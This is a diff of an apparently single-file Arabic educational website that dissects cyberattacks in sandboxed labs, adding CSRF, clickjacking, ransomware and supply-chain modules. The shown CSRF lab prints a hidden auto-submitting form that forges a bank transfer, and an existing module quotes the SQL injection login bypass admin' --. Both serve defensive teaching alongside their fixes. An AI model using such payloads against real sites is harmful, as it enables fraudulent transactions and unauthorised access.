@@ -65,13 +65,14 @@
   .mod-no{font:600 11px var(--mono);color:var(--dim);letter-spacing:2px}
   .mod-title{font-size:clamp(22px,3vw,30px);font-weight:700;letter-spacing:-.4px}
   .mod-title .en{font:500 11px var(--mono);color:var(--acc);letter-spacing:1.5px;margin-inline-start:12px;vertical-align:3px}
-  .mod-lead{color:var(--mut);font-size:13.5px;line-height:1.9;margin-top:10px;max-width:760px;font-weight:300}
+  .mod-lead{color:var(--mut);font-size:13.5px;line-height:1.9;margin-top:10px;max-width:780px;font-weight:300}
   .mod-lead b{color:var(--ink);font-weight:500}
+  .mod-lead .mono{direction:ltr;unicode-bidi:embed}
   .mod-end{margin-top:16px;text-align:center}
 
   /* ===== عناصر تحكم مشتركة ===== */
   .seg{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-  .seg.c4{grid-template-columns:1fr 1fr}
+  .seg.c3{grid-template-columns:repeat(3,1fr)}
   .seg button{padding:9px 12px;border:1px solid var(--line2);background:transparent;color:var(--ink);cursor:pointer;text-align:start;transition:.18s;font-family:var(--sans)}
   .seg button b{display:block;font-size:13px;font-weight:600}
   .seg button i{display:block;font-style:normal;font-size:10.5px;color:var(--dim);margin-top:3px}
@@ -85,6 +86,11 @@
   .btn{font:500 12.5px var(--sans);padding:9px 18px;border:1px solid var(--line2);background:transparent;color:var(--ink);cursor:pointer;transition:.18s}
   .btn:hover{border-color:var(--acc);color:var(--acc)}
   .btn.on{background:var(--acc);color:#171105;border-color:var(--acc);font-weight:600}
+  .btn.red{border-color:#6E3539;color:#E8767A}
+  .btn.red:hover{border-color:var(--red);background:rgba(229,72,77,.08)}
+  .btn:disabled{opacity:.4;pointer-events:none}
+  .btn-grn{font:600 12.5px var(--sans);padding:9px 18px;background:var(--grn);border:1px solid var(--grn);color:#0B1512;cursor:pointer}
+  .btn-grn:hover{filter:brightness(1.12)}
   input[type=text],input[type=password]{background:#0D1013;border:1px solid var(--line2);color:var(--ink);padding:9px 12px;font-family:var(--sans);font-size:13.5px;width:100%}
   input[type=text]:focus,input[type=password]:focus{outline:none;border-color:var(--acc)}
   input[type=range]{width:100%;margin-top:8px;accent-color:var(--red);cursor:pointer}
@@ -124,6 +130,7 @@
   .f-d b{color:var(--ink);font-weight:500}
   .verdict{margin:14px 4px 18px;padding:15px 18px;border:1px solid rgba(242,169,59,.3);background:rgba(242,169,59,.04);font-size:13px;line-height:1.85;color:var(--ink);font-weight:300}
   .verdict b{color:var(--acc);font-weight:600}
+  .panel-act{display:flex;gap:10px;padding:12px 16px;border-top:1px solid var(--line);flex-wrap:wrap;align-items:center}
 
   /* ===== وحدة الإغراق ===== */
   .stage{display:block;width:100%;height:auto}
@@ -147,7 +154,6 @@
   .shld{fill:none;stroke:var(--acc);stroke-width:1;stroke-dasharray:4 6}
   .gtxt{fill:var(--acc);font:500 10px var(--mono)}
   .botbody{fill:#171416;stroke:#5A3438;stroke-width:1.2}
-  .botled{fill:var(--red)}
   .refl{fill:var(--panel2);stroke:var(--line2);stroke-width:1.2}
   .userbody{fill:var(--panel2);stroke:var(--line2);stroke-width:1.2}
   .ft-note{fill:#E8767A;font:500 10.5px var(--sans);text-anchor:middle}
@@ -333,17 +339,69 @@
   .mw-bad{font:500 12px var(--sans);padding:8px 14px;background:transparent;border:1px solid #6E3539;color:#E8767A;cursor:pointer}
   .mw-bad:hover{background:rgba(229,72,77,.12)}
 
-  /* ===== النشر ===== */
-  .dep-steps{padding:6px 16px 10px}
-  .dep-step{display:grid;grid-template-columns:40px 1fr;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line)}
-  .dep-step:last-child{border-bottom:none}
-  .dep-step .n{font:600 14px var(--mono);color:var(--acc)}
-  .dep-step .t{font-size:13.5px;font-weight:600}
-  .dep-step .d{font-size:12.5px;color:var(--mut);line-height:1.9;margin-top:5px;font-weight:300}
-  .dep-step code{font:500 11px var(--mono);background:#0D1013;border:1px solid var(--line2);padding:2px 8px;direction:ltr;unicode-bidi:embed;color:var(--acc);white-space:nowrap}
-  .dep-code{margin:4px 16px 18px;background:#0D1013;border:1px solid var(--line2);padding:14px 16px;font:500 11.5px var(--mono);direction:ltr;text-align:left;color:#B9C2C9;line-height:2;overflow-x:auto}
-  .dep-code .c{color:var(--dim)}
-  .dep-note{margin:0 16px 18px;padding:12px 15px;border:1px dashed var(--line2);font-size:11.5px;color:var(--mut);line-height:1.85}
+  /* ===== 07 · CSRF ===== */
+  .cf-cats{padding:16px}
+  .cf-hero{display:flex;gap:14px;align-items:center}
+  .cf-hero b{font-size:16px;display:block}
+  .cf-sub{font-size:12px;color:var(--mut);margin-top:4px}
+  .cf-text{font-size:12.5px;color:var(--mut);line-height:1.9;margin-top:12px;font-weight:300}
+  .cf-srcrow{display:flex;align-items:center;gap:10px;margin-top:16px;font-size:12px;font-weight:600}
+  .cf-src{margin-top:10px;background:#0D1013;border:1px solid var(--line2);padding:12px 14px;font:500 11.5px var(--mono);direction:ltr;text-align:left;color:#B9C2C9;line-height:1.9;overflow-x:auto;white-space:pre}
+  .cf-src .cmt{color:var(--dim)}.cf-src .tag{color:var(--red)}.cf-src .att{color:var(--acc)}
+  .cf-bal{font:600 30px var(--mono);direction:ltr;transition:color .3s}
+  .cf-bal.hit{color:var(--red)}
+  .cf-sess{font-size:11.5px;color:var(--dim);margin-top:6px;line-height:1.8}
+
+  /* ===== 08 · اختطاف النقرة ===== */
+  .cj-stage{position:relative;height:330px;overflow:hidden;border-bottom:1px solid var(--line)}
+  .cj-bank{position:absolute;inset:0}
+  .cj-bank-inner{width:64%;margin:16px auto 0;border:1px solid var(--line2);background:var(--panel2)}
+  .cj-bank-head{padding:8px 12px;border-bottom:1px solid var(--line);font:600 11px var(--mono);color:var(--dim);direction:ltr;text-align:left;letter-spacing:.5px}
+  .cj-bank-row{padding:8px 12px;font-size:12.5px;color:var(--mut);border-bottom:1px solid rgba(255,255,255,.04)}
+  .cj-bank-row .mono{color:var(--ink)}
+  .cj-bank-btn{position:absolute;top:186px;left:50%;transform:translateX(-50%);width:240px;padding:12px;border:1px solid rgba(91,190,142,.5);background:rgba(91,190,142,.1);color:var(--grn);font:600 13px var(--sans);cursor:default;pointer-events:none}
+  .cj-lure{position:absolute;inset:0;background:var(--bg);text-align:center;padding-top:54px;transition:opacity .35s}
+  .cj-lure b{font-size:19px}
+  .cj-lure .cf-sub{margin-top:6px}
+  .cj-lure-btn{position:absolute;top:172px;left:50%;transform:translateX(-50%);padding:17px 44px;border:none;background:var(--acc);color:#171105;font:700 15px var(--sans);cursor:pointer}
+  .cj-stage.xray .cj-lure{opacity:.13}
+  .cj-stage.xray .cj-bank-btn{outline:2px dashed var(--red);outline-offset:3px}
+  .cj-refuse{position:absolute;inset:0;display:none;align-items:center;justify-content:center;border:2px dashed rgba(229,72,77,.5);background:#0C0E10}
+  .cj-stage.framed .cj-bank{display:none}
+  .cj-stage.framed .cj-refuse{display:flex}
+  .cj-xonly{display:none;position:absolute;font-size:11px}
+  .cj-stage.xray .cj-xonly{display:block}
+  .cj-lab-top{top:20px;left:22px;color:var(--acc)}
+  .cj-lab-bot{top:252px;left:22px;color:#E8767A}
+
+  /* ===== 09 · الفدية ===== */
+  .rw-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;padding:14px 16px}
+  .rw-file{border:1px solid var(--line2);background:#0E1215;padding:11px 8px;text-align:center;transition:border-color .3s,background .3s}
+  .rw-file.locked{border-color:rgba(229,72,77,.55);background:rgba(229,72,77,.05)}
+  .rw-file .rw-name{font-size:10.5px;color:var(--mut);margin-top:7px;word-break:break-word;line-height:1.5}
+  .rw-file.locked .rw-name{color:#E8767A;font-family:var(--mono);direction:ltr;word-break:break-all}
+  .rw-file .rw-size{font:500 9.5px var(--mono);color:var(--dim);margin-top:3px;direction:ltr}
+  .rw-file .rw-ic{height:26px;display:flex;align-items:center;justify-content:center}
+  .rw-note{margin:14px 16px;border:1px solid var(--red);background:rgba(229,72,77,.06);padding:16px;animation:capIn .4s ease}
+  .rw-note h4{color:var(--red);font-size:15px}
+  .rw-note .rw-nt{font-size:12.5px;color:var(--mut);line-height:1.9;margin-top:8px}
+  .rw-timer{font:600 32px var(--mono);color:var(--red);direction:ltr;margin:12px 0 6px}
+  .rw-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+
+  /* ===== 10 · سلسلة التوريد ===== */
+  #scBuild.bad .node{stroke:var(--red)}
+  #scBuild.bad .sled{fill:var(--red);animation:blink .45s infinite}
+  .cl{fill:var(--panel2);stroke:var(--line2);stroke-width:1;transition:fill .25s,stroke .25s}
+  .cl.inf{fill:rgba(229,72,77,.8);stroke:var(--red)}
+  .sc-count{font:600 20px var(--mono);direction:ltr;color:var(--ink);transition:color .3s}
+  .sc-count.bad{color:var(--red)}
+  #scPkgRes{margin:14px 16px 16px;padding:13px 15px;font-size:12.5px;line-height:1.85;display:none}
+  #scPkgRes.show{display:block;animation:capIn .3s ease}
+  #scPkgRes.ok{border:1px solid rgba(91,190,142,.4);background:rgba(91,190,142,.05)}
+  #scPkgRes.bad{border:1px solid rgba(229,72,77,.45);background:rgba(229,72,77,.06)}
+  #scPkgRes b{display:block;margin-bottom:4px}
+  #scPkgRes.ok b{color:var(--grn)}#scPkgRes.bad b{color:#E8767A}
+  #scPkgRes span{color:var(--mut);font-weight:300}
 
   footer{margin-top:26px;text-align:center;color:var(--dim);font-size:11px;line-height:1.9}
   #toast{position:fixed;bottom:22px;inset-inline-start:22px;max-width:390px;background:var(--panel2);border:1px solid var(--line2);border-inline-start:3px solid var(--acc);padding:13px 17px;font-size:13px;line-height:1.75;opacity:0;transform:translateY(10px);transition:.3s;pointer-events:none;z-index:60;box-shadow:0 8px 30px rgba(0,0,0,.45)}
@@ -361,6 +419,8 @@
     .f-no{display:none}
     .b-row{grid-template-columns:1fr;gap:6px}
     .b-row .v{text-align:right}
+    .rw-grid{grid-template-columns:repeat(2,1fr)}
+    .seg.c3{grid-template-columns:1fr}
   }
 </style>
 </head>
@@ -374,9 +434,9 @@
     <p class="lead">
       موسوعة تفاعلية تُشرّح أشهر الهجمات السيبرانية <b>من مقعد المدافع</b>: كل هجوم له مختبر حي
       تشغّله بيدك — تطلق الهجوم، ترى بالضبط كيف يسقط الهدف، ثم تفعّل الدفاع الصحيح وتُعيده للحياة.
-      لا أدوات هجوم، لا كود استغلال، لا خوادم: <b>ملف واحد يعمل في متصفحك</b> — جاهز للنشر على GitHub Pages.
+      لا أدوات هجوم، لا كود استغلال، لا خوادم: <b>ملف واحد يعمل في متصفحك</b>.
     </p>
-    <div class="hero-stats">06 ATTACKS · 06 LIVE LABS · 01 FILE · 00 SERVERS</div>
+    <div class="hero-stats">10 ATTACKS · 10 LIVE LABS · 01 FILE · 00 SERVERS</div>
   </header>
 
   <!-- ============ الفهرس ============ -->
@@ -427,16 +487,44 @@
       <span class="cat-sev" data-s="4"></span>
       <span class="cat-arrow">‹</span>
     </div>
-    <div class="cat-row teaser">
+    <div class="cat-row" data-mod="mod-csrf" tabindex="0" role="button">
       <span class="cat-no" dir="ltr">07</span>
-      <span class="cat-main"><em>قيد التشريح: رانسوموير · Zero-Day · هندسة اجتماعية متقدمة — المستودع ملكك: أضف التشريح القادم بنفس القالب.</em></span>
+      <span class="cat-main"><b>تزوير الطلب</b><i dir="ltr">CSRF</i><em>متصفحك يرسل الحوالة بنفسه — لا كلمة سر سُرقت ولا بنك اخترق.</em></span>
+      <span class="cat-target">ثقة الجلسة</span>
+      <span class="cat-sev" data-s="4"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-cj" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">08</span>
+      <span class="cat-main"><b>اختطاف النقرة</b><i dir="ltr">CLICKJACKING</i><em>زر بريء فوق زر خطر — نقرة واحدة، والطبقة الشفافة تكفي.</em></span>
+      <span class="cat-target">واجهاتك</span>
+      <span class="cat-sev" data-s="3"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-rw" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">09</span>
+      <span class="cat-main"><b>برنامج الفدية</b><i dir="ltr">RANSOMWARE</i><em>تشفير حقيقي بيد خاطئة — والدفع يانصيب، لا مخرج.</em></span>
+      <span class="cat-target">ملفاتك</span>
+      <span class="cat-sev" data-s="5"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-sc" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">10</span>
+      <span class="cat-main"><b>سلسلة التوريد</b><i dir="ltr">SUPPLY CHAIN</i><em>لا تخترق أنت — يُخترق من تستأمن عليه، باسمه وتوقيعه.</em></span>
+      <span class="cat-target">برمجياتك الموثوقة</span>
+      <span class="cat-sev" data-s="5"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row teaser">
+      <span class="cat-no" dir="ltr">…</span>
+      <span class="cat-main"><em>قيد التشريح: Zero-Day · تسميم DNS · هندسة اجتماعية متقدمة — المستودع ملكك: انسخ قالب أي وحدة وولّد التشريح القادم.</em></span>
       <span class="cat-arrow">…</span>
     </div>
   </section>
 
   <!-- ============ 01 · الإغراق ============ -->
   <section class="module" id="mod-ddos" hidden>
-    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 01 / 06</span></div>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 01 / 10</span></div>
     <h2 class="mod-title">الإغراق <span class="en" dir="ltr">DDoS · DoS</span></h2>
     <p class="mod-lead">المهاجم لا يخترق شيئاً — فقط يطلب من الخادم <b>أكثر مما يستطيع</b>. اختر السلاح وحجم الجيش، اضغط الإطلاق، شاهد المورد المستهدف ينهار، ثم شغّل الدفاع المناسب لتعيد الخادم للحياة. كل ذلك في صندوق رمل محلي بالكامل.</p>
 
@@ -553,7 +641,7 @@
     <div class="panel">
       <div class="p-head">حدود الدرس</div>
       <div class="facts">
-        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">لا اختراق — فقط مفاضلة موارد</div><div class="f-d">SYN يملأ <b>جدول الاتصالات</b> بمصافحات لا تكتمل (SYN ثم SYN-ACK ثم… لا شيء) · HTTP ينهك <b>المعالج</b> بطلبات كاملة · UDP/التضخيم يغرق <b>الأنبوب</b> نفسه. ولهذا لا يحمي منه تشفير ولا VPN: الطوفان لا يقرأ حركتك أصلاً.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">لا اختراق — فقط مفاضلة موارد</div><div class="f-d">SYN يملأ <b>جدول الاتصالات</b> بمصافحات لا تكتمل · HTTP ينهك <b>المعالج</b> بطلبات كاملة · UDP والتضخيم يغرقان <b>الأنبوب</b> نفسه. ولهذا لا يحمي منه تشفير ولا VPN: الطوفان لا يقرأ حركتك أصلاً.</div></div>
         <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">DoS مقابل DDoS — فرق مصيري في الدفاع</div><div class="f-d"><b>DoS</b> مصدر واحد: قاعدة حجب واحدة تُنهيه (جرّب RATE-LIMIT بنمط DoS). <b>DDoS</b>: كل بوت «تحت الحد» بمفرده فيمرّ — بدّل النمط وأعد التجربة بنفس الدفاع.</div></div>
         <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">التضخيم: طاقة لا يملكها المهاجم</div><div class="f-d">استعلام صغير بـ«مصدر» مزيَّف يجعل المُنعكسات البريئة تردّ على الضحية <b>بآلاف الأضعاف</b> (Memcached بلغت ×51,000). العلاج النظامي <b>BCP38</b>: منع التزييف عند مزوّدي الخروج — مسؤولية الشبكات لا الضحايا.</div></div>
       </div>
@@ -564,7 +652,7 @@
 
   <!-- ============ 02 · التصيّد ============ -->
   <section class="module" id="mod-phish" hidden>
-    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 02 / 06</span></div>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 02 / 10</span></div>
     <h2 class="mod-title">التصيّد الاحتيالي <span class="en" dir="ltr">PHISHING</span></h2>
     <p class="mod-lead">أضعف حلقة في أي نظام ليست تقنية — <b>إنها أنت</b>. أمامك رسالة احتيال محبوكة بعناية تحمل <b>6 مؤشرات خداع</b>. مهمتك: اعثر عليها كلها قبل أن تضغط الرابط. مرّر فوق أي جزء يريبك واضغط عليه.</p>
 
@@ -584,7 +672,7 @@
           <div id="pLinkHint">الهدف الحقيقي عند الضغط: <b>verify-account.top</b> — كلمة «paypal.com» ليست إلا اسماً فرعياً زخرفياً داخل العنوان.</div>
           <br>
           ولإتمام التحقق ستحتاج إلى <span class="p-flag" data-k="pass" data-t="طلب بيانات حساسة" data-ex="لا جهة شرعية على وجه الأرض تطلب كلمة مرورك أو رقم بطاقتك كاملاً عبر رسالة — أبداً. هذا هو المؤشر القاطع الذي لا يحتاج أي خبرة تقنية.">إدخال كلمة مرورك ورقم بطاقتك كاملة</span> خلال 24 ساعة، وإلا أُغلق الحساب نهائياً.<br><br>
-          تجد تعليمات إضافية في المرفق: <span class="p-flag" data-k="att" data-t="مرفق تنفيذي" data-ex="ملف ‎.exe‎ — برنامج وليس مستنداً. البنوك لا ترسل برامج أبداً. أي مرفق تنفيذي من «جهة مالية» هو برنامج تجسس أو رانسوموير بانتظار نقرة واحدة.">تحديث_الأمان.exe‏ (2.1 MB)</span><br><br>
+          تجد تعليمات إضافية في المرفق: <span class="p-flag" data-k="att" data-t="مرفق تنفيذي" data-ex="ملف ‎.exe‎ — برنامج وليس مستنداً. البنوك لا ترسل برامج أبداً. أي مرفق تنفيذي من «جهة مالية» هو برنامج تجسس أو فدية بانتظار نقرة واحدة.">تحديث_الأمان.exe‏ (2.1 MB)</span><br><br>
           <span class="m-sig">تحياتنا،<br>فريق الدعم الفني — PayPal</span>
         </div>
       </div>
@@ -602,7 +690,7 @@
       <div class="facts">
         <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">أنجح هجوم في العالم — لأنه أرخصها</div><div class="f-d">لا يحتاج ثغرات ولا خبرة: بريد جماعي يكلف فتاياً، ويعود بأرباح سرقة جلسات وحسابات. أغلب الاختراقات الكبرى المعروفة بدأت <b>برسالة واحدة ناجحة</b> لموظف واحد.</div></div>
         <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">الحماية عادة، لا برنامج</div><div class="f-d">مرّر فوق أي رابط قبل الضغط · اقرأ ما بين <b>آخر نقطتين</b> في العنوان · لا تفتح مرفقات تنفيذية · أي «استعجال» علامة احتيال · وعند الشك: <b>اكتب عنوان الموقع بيدك</b>.</div></div>
-        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">التحقق بخطوتين (MFA) يكسر أغلب السيناريو</div><div class="f-d">حتى لو سلّمت كلمة مرورك، يبقى المحتال محتاجاً جهازك/تطبيقك للتوليد. ليست حصينة (اعتراض OTP وارد)، لكنها ترفع كلفة السرقة فوق ما يستحق أغلب المحتالين.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">التحقق بخطوتين (MFA) يكسر أغلب السيناريو</div><div class="f-d">حتى لو سلّمت كلمة مرورك، يبقى المحتال محتاجاً جهازك أو تطبيقك للتوليد. ليست حصينة (اعتراض OTP وارد)، لكنها ترفع كلفة السرقة فوق ما يستحق أغلب المحتالين.</div></div>
       </div>
       <p class="verdict"><b>الخلاصة:</b> التصيّد ليس هجوماً على التقنية بل على الانتباه: كل المؤشرات كانت ظاهرة في الرسالة قبل أول نقرة — من يتعلم قراءتها يصبح أصعب هدف في القائمة، والمحتال بطبعه يبحث عن الأسهل.</p>
     </div>
@@ -611,7 +699,7 @@
 
   <!-- ============ 03 · الحقن ============ -->
   <section class="module" id="mod-sqli" hidden>
-    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 03 / 06</span></div>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 03 / 10</span></div>
     <h2 class="mod-title">الاستعلام الخائن <span class="en" dir="ltr">SQL INJECTION</span></h2>
     <p class="mod-lead">نموذج دخول بريء + استعلام يُبنى <b>بلصق النصوص</b> = باب خلفي مفتوح. اكتب في حقل المستخدم: <b class="mono" dir="ltr">admin' --</b> ثم اضغط دخول — وراقب سطر الاستعلام يتحول حرفاً حرفاً أمامك. بعد ذلك شغّل العلاج القطعي وراقب الحقن نفسه يتحول إلى نصٍّ بلا معنى.</p>
 
@@ -672,7 +760,7 @@
 
   <!-- ============ 04 · XSS ============ -->
   <section class="module" id="mod-xss" hidden>
-    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 04 / 06</span></div>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 04 / 10</span></div>
     <h2 class="mod-title">الشيفرة المدسوسة <span class="en" dir="ltr">XSS</span></h2>
     <p class="mod-lead">الموقع يعرض ما يكتبه الزوار — فماذا لو كان «ما يُكتب» <b>شيفرة</b>؟ انشر تعليقاً يحمل حقنة وشاهد جلسة زائر بريء تُسرق أمامك، ثم فعّل «تصريف المخرجات» وشاهد <b>نفس الحقنة</b> تتحول إلى حبرٍ بلا ناب. البيئة وهمية بالكامل داخل صفحتك.</p>
 
@@ -722,7 +810,7 @@
 
   <!-- ============ 05 · التخمين ============ -->
   <section class="module" id="mod-brute" hidden>
-    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 05 / 06</span></div>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 05 / 10</span></div>
     <h2 class="mod-title">التخمين الصبور <span class="en" dir="ltr">BRUTE FORCE</span></h2>
     <p class="mod-lead">لا عبقرية هنا — فقط <b>صبر ورياضيات</b>. أولاً قِس مقاومة كلمة مرورك بالأرقام (الحساب محلي، لا يغادر المتصفح). ثم شاهد هجوماً حياً على رقم سري من 4 خانات: مرة بلا قفل ينهار في دقيقة، ومرة بقفل بسيط يتحول إلى ساعات.</p>
 
@@ -780,7 +868,7 @@
 
   <!-- ============ 06 · المنتصف ============ -->
   <section class="module" id="mod-mitm" hidden>
-    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 06 / 06</span></div>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 06 / 10</span></div>
     <h2 class="mod-title">المستمع في المنتصف <span class="en" dir="ltr">MITM</span></h2>
     <p class="mod-lead">بينك وبين بنكك مسارٌ قد يحمله مستمع — نقطة واي فاي عامة، أو جهازٌ في شبكتك. أرسل حوالة وشاهد ما تلتقطه <b>عين المنتصف</b>. ثم فعّل TLS وراقبها تعمى… إلا إذا ضغطتَ «تجاهل» بيدك أنت — فالقرار الأخير دائماً بشري.</p>
 
@@ -852,26 +940,278 @@
     <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
   </section>
 
-  <!-- ============ النشر ============ -->
-  <section class="panel" id="deploy">
-    <div class="p-head">انشر الموقع بنفسك — GitHub Pages في 4 خطوات <span class="p-tag" dir="ltr">DEPLOY</span></div>
-    <div class="dep-steps">
-      <div class="dep-step"><span class="n" dir="ltr">01</span><div><div class="t">أنشئ مستودعاً باسمك الخاص</div><div class="d">على GitHub: مستودع جديد باسم <code>username.github.io</code> (استبدل username باسم حسابك) — هذا الاسم يمنحك عنواناً مباشراً بلا مسار. أي مستودع آخر يعمل أيضاً عبر إعدادات Pages.</div></div></div>
-      <div class="dep-step"><span class="n" dir="ltr">02</span><div><div class="t">احفظ الكود باسم index.html وارفعه</div><div class="d">انسخ كود هذه الصفحة كاملاً إلى ملف اسمه <code>index.html</code> ثم ارفعه للمستودع (زر Add file → Upload files). لا حاجة لأي بناء أو حزم — الملف مكتفٍ بذاته.</div></div></div>
-      <div class="dep-step"><span class="n" dir="ltr">03</span><div><div class="t">فعّل Pages من الإعدادات</div><div class="d">Settings ← Pages ← Branch: اختر <code>main</code> والجذر <code>/ (root)</code> ثم Save. خلال دقيقة أو دقيقتين يُبنى الموقع تلقائياً.</div></div></div>
-      <div class="dep-step"><span class="n" dir="ltr">04</span><div><div class="t">موقعك حيّ</div><div class="d">افتح <code>https://username.github.io</code> — شارك الرابط مع من تشاء. كل تعديل تدفعه إلى main يحدّث الموقع خلال دقيقة.</div></div></div>
+  <!-- ============ 07 · تزوير الطلب ============ -->
+  <section class="module" id="mod-csrf" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 07 / 10</span></div>
+    <h2 class="mod-title">تزوير الطلب <span class="en" dir="ltr">CSRF</span></h2>
+    <p class="mod-lead">أنت مسجّل في البنك في تبويب، وتفتح موقع قطط بريئاً في تبويب آخر — فيرسل الموقع «نيابة عنك» حوالة إلى البنك، وملفات تعريفك ترافق الطلب <b>تلقائياً</b>. البنك لا يملك طريقة ليعرف أن الطلب لم تصنعه يدك. فعّل دفاعاً واحداً وشاهد الفرق الجذري.</p>
+
+    <div class="duo">
+      <div class="panel">
+        <div class="p-head">موقع «قطط العالم» — تبويب بريء الظاهر <span class="p-tag" dir="ltr">TAB 2 · cats.example</span></div>
+        <div class="cf-cats">
+          <div class="cf-hero">
+            <svg width="58" height="58" viewBox="0 0 64 64" fill="none">
+              <path d="M16 24 L13 8 L28 17" fill="#171416" stroke="#5A3438" stroke-width="2"/>
+              <path d="M48 24 L51 8 L36 17" fill="#171416" stroke="#5A3438" stroke-width="2"/>
+              <circle cx="32" cy="36" r="21" fill="#171416" stroke="#5A3438" stroke-width="2"/>
+              <circle cx="24" cy="32" r="2.6" fill="#F2A93B"/>
+              <circle cx="40" cy="32" r="2.6" fill="#F2A93B"/>
+              <path d="M32 40 L28.5 44.5 L35.5 44.5 Z" fill="#E5484D"/>
+              <path d="M32 47 Q30 51 26 50 M32 47 Q34 51 38 50" stroke="#5E6870" stroke-width="1.4"/>
+            </svg>
+            <div>
+              <b>صوّت لأجمل قطة هذا الأسبوع!</b>
+              <div class="cf-sub">موقع تصويت خفيف — لا يتطلب تسجيل دخول ولا أي شيء</div>
+            </div>
+          </div>
+          <p class="cf-text">كل ما تراه بريء تماماً… والمصدر يحمل ما لا تراه: نموذج خفي يستهدف بنكك أنت — لأنك <b style="color:var(--ink)">مسجّل فيه الآن</b> في التبويب المجاور.</p>
+          <button class="btn on" id="cfVisit">افتح الموقع في تبويب جديد</button>
+          <div class="cf-srcrow"><span>اعرض مصدر الصفحة</span><div class="sw" id="cfSrcSw"><i></i></div></div>
+          <pre class="cf-src" id="cfSrc" hidden><span class="cmt">&lt;!-- cats.example — كل ما في الصفحة المرئية --&gt;</span>
+&lt;h1&gt;صوّت لأجمل قطة هذا الأسبوع!&lt;/h1&gt;
+
+<span class="cmt">&lt;!-- وما لا تراه عينك: --&gt;</span>
+&lt;<span class="tag">form</span> action=<span class="att">"https://bank.example/transfer"</span>
+      method=<span class="att">"POST"</span> style=<span class="att">"display:none"</span>&gt;
+  &lt;<span class="tag">input</span> type=<span class="att">"hidden"</span> name=<span class="att">"to"</span>  value=<span class="att">"m0ther.example"</span>&gt;
+  &lt;<span class="tag">input</span> type=<span class="att">"hidden"</span> name=<span class="att">"amt"</span> value=<span class="att">"5000"</span>&gt;
+&lt;/<span class="tag">form</span>&gt;
+&lt;<span class="tag">script</span>&gt;document.forms[0].submit()&lt;/<span class="tag">script</span>&gt;</pre>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="p-head">بنك المستقبل — تبويبك المفتوح منذ الصباح <span class="p-tag" dir="ltr">TAB 1 · bank.example</span></div>
+        <div class="cbody">
+          <div class="cf-bal" id="cfBal" dir="ltr">12,400</div>
+          <div class="cf-sess">جلسة نشطة منذ 09:14 — <span class="mono" dir="ltr">SESSION=8f3a9c•••</span> يرفقها متصفحك مع كل طلب إلى bank.example، أياً كان من أرسله.</div>
+        </div>
+        <div class="logbox" id="cfTr" style="min-height:88px">
+          <div class="cap"><span class="ct" dir="ltr">09:14</span><span class="chipx c-dim">220 → فاتورة الكهرباء — من داخل تطبيق البنك، بيدك</span></div>
+        </div>
+        <div class="drow" id="cfSsRow" tabindex="0" role="switch" aria-checked="false">
+          <div class="d-num" dir="ltr">D1</div>
+          <div>
+            <div class="d-name">ملف جلسة SameSite=Strict<span class="d-code" dir="ltr">SAMESITE</span></div>
+            <div class="d-desc">ملف الجلسة لا يُرفق إلا مع الطلبات المنبثقة من موقع البنك نفسه — طلب cats.example يصل بلا هوية.</div>
+          </div>
+          <div class="sw" id="cfSsSw"><i></i></div>
+        </div>
+        <div class="drow" id="cfTokRow" tabindex="0" role="switch" aria-checked="false">
+          <div class="d-num" dir="ltr">D2</div>
+          <div>
+            <div class="d-name">رمز CSRF لكل جلسة<span class="d-code" dir="ltr">CSRF TOKEN</span></div>
+            <div class="d-desc">سرّ عشوائي يُصدَر لجلستك ويُضمَّن في نماذج البنك فقط — أي نموذج خارجي لا يملكه ولا يستطيع تخمينه.</div>
+          </div>
+          <div class="sw" id="cfTokSw"><i></i></div>
+        </div>
+      </div>
     </div>
-    <div class="dep-code"><span class="c"># أو بالأوامر من جهازك:</span>
-git init
-git add index.html
-git commit -m "مِرصاد: موسوعة تفاعلية لتشريح الهجمات — تعليم دفاعي"
-git branch -M main
-git remote add origin https://github.com/USERNAME/USERNAME.github.io.git
-git push -u origin main</div>
-    <div class="dep-note">
